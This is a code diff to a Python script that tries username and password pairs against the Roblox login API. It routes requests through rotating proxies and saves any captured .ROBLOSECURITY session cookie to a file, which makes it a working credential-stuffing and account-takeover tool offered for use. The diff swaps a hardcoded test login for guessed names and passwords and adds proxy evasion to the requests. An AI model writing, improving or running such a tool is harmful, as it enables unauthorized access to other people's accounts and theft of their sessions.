@@ -1,9 +1,10 @@
 import random
 import re
+from socket import timeout
 import requests
 import json
 import threading
-
+proxye = open('proxies.txt').read()
 f = open('namelist.json')
 data = json.loads(f.read())
 question = str(input("only accounts with numbers in name? yes or no: "))
@@ -17,7 +18,7 @@ question = str(input("proxies yes or no: "))
 if question == "yes":
 
     proxiees = True
-    proxye = open('proxies.txt').read()
+    
 if question == "no":
 
     proxiees = False
@@ -48,29 +49,35 @@ def getbot():
 def checkacc(name,passs):
     try:
         session = requests.Session()    
-        if proxiees == True:                 
-            proxyee = proxye.splitlines()
-            ex = random.choice(proxyee)
-            proxy = {"http": ex, "https": ex}
-            session.verify = False
-            session.proxies.update(proxy)
-            session.trust_env=False
-
-        xthingtokenfuck = session.post(f"https://auth.roblox.com/v2/signup").headers['x-csrf-token']
+                   
+        proxyee = proxye.splitlines()
+        ex = random.choice(proxyee)
+        proxy = {"http": ex, "https": ex}
+          
+        if proxiees == True:
+         xthingtokenfuck = session.post(f"https://auth.roblox.com/v2/signup",proxies=proxy).headers['x-csrf-token']
+        else:
+          xthingtokenfuck = session.post(f"https://auth.roblox.com/v2/signup").headers['x-csrf-token']    
         headers = {
             'x-csrf-token': xthingtokenfuck,
              'accept': 'application/json, text/plain, */*',
-             'content-type': 'application/json;charset=UTF-8'
+             'content-type': 'application/json;charset=UTF-8',
+             'User-Agent': 'Chrome'
         }
-        session.headers = headers
-        data = '{"ctype":"Username","cvalue":"KirkKlein16","password":"61nielKkriK"}'
-        response = session.post('https://auth.roblox.com/v2/login', headers=headers, data=data)
+        ex = random.choice(proxyee)
+        proxy = {"http": ex, "https": ex}
+        data = {"ctype":"Username","cvalue":name,"password":passs}
+        data = str(data)
+        if proxiees == True:
+         response = session.post('https://auth.roblox.com/v2/login', headers=headers, data=data,proxies=proxy,timeout=50)
+        else:
+            response = session.post('https://auth.roblox.com/v2/login', headers=headers, data=data) 
         print(response.json())
         cookie = session.cookies['.ROBLOSECURITY']
         with open ('cookies.txt','w') as file:
             file.write(cookie + '\n')
     except Exception as err:
-       print(err + 'z')
+       print(err)
     
 
 
